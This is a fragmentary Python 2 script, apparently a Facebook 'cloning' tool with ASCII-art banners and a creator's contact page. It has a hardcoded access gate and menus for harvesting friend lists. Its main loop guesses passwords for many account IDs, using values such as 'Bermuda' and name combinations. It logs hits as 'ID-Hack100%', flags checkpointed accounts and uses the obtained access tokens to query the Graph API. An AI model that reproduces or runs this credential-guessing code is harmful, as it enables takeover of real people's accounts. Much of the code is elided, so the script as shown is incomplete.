...
♨️°───────(Shanto)───────°♨️
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
\033[1;96m║✯ Creator ✯ ARAFAT SHANTO       ║    
\033[1;98m║✯ SHANTO VAU           ║  
...
print  """
\033[1;97m************************************************
\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE ARAFAT SHANTO ~
\033[1;97m************************************************
...
\033[1;92m║╚═╝║║─║║╔═╗║║─║║║─║║─║╚═╝║
\033[1;92m╚═══╩╝─╚╩╝─╚╩╝─╚═╝─╚╝─╚═══╝
Knock Me On Facebook For Username & Password.
Facebook: https://facebook.com/arafatshanto520

"""

CorrectUsername = "ok"
CorrectPassword = "clone"
loop = 'true'
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://www.facebook.com/arafatshanto520')
    else:
...
def login():
	...
	try:
		...
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mMaybe Your Acoount Is on Checkpoint")
...
def menu():
	...
	print "\033[1;36;40m      ╚═════════════════════════════════╝"
	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start Cloning"	
	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Update This Tool"																														
...
def super():
	...
	os.system('clear')
	print logo
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone Your Friend List."
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Clone From Public Accounts Friend List ."
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91mARAFAT-SHANTO\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;91mARAFAT-SHANTO\033[1;95m◈•══════•◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found or Maybe Your Account is on Checkpoint!"
	...
	print "   \033[1;92m◄══════════════════SHANTO══════════════════►"

	jalan('          \033[1;91mStarting cloning Wait... IT May Take some minutes')
	print  "  \033[1;92m ◄══════════════════VAU══════════════════►" 
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mID-Hack100%'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mID-Checkpoint'
						                       ...
						                       if 'access_token' in q:	
							                           ...
							                           pass6 = 'Bermuda'											
								                           ...
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								                               ...
								                               pass7 = b['first_name'] + b['second_name']						
	...
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91mARAFAT-SHANTO\033[1;95m◈•▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By ARAFAT-SHANTO-•◈•---»" #Dev:Shanto
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 clone.py)↩\033[1;97m....'
...
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ..ARAFAT-SHANTO.. \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91marafatshanto520"""
